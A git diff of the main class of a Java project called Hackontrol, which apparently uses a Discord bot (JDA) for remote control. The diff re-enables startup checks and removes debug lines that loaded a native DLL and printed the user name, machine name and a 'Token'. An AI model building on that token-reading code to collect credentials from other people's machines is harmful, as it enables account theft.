@@ -1,7 +1,11 @@
 package com.khopan.hackontrol;
 
+import java.io.File;
 import java.util.Collections;
 import java.util.List;
+
+import javax.swing.JOptionPane;
+import javax.swing.UIManager;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -17,6 +21,7 @@ import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
+import com.khopan.hackontrol.utils.HackontrolError;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -223,7 +228,7 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
-		/*UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
+		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 
 		if(args.length < 1) {
 			JOptionPane.showMessageDialog(null, "Invalid program argument", "Error", JOptionPane.ERROR_MESSAGE);
@@ -253,14 +258,10 @@ public class Hackontrol {
 			JOptionPane.showMessageDialog(null, HackontrolError.getMessage(Errors), "Error", JOptionPane.ERROR_MESSAGE);
 			System.exit(1);
 			return;
-		}*/
+		}
 
-		//Hackontrol.LOGGER.info("Initializing");
-		//Hackontrol.getInstance();
-		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Debug\\libnative32.dll");
-		System.out.println("Username: " + Information.getUserName());
-		System.out.println("Machine name: " + Information.getMachineName());
-		System.out.println("Token: " + Information.getToken());
+		Hackontrol.LOGGER.info("Initializing");
+		Hackontrol.getInstance();
 	}
 
 	public static Hackontrol getInstance() {
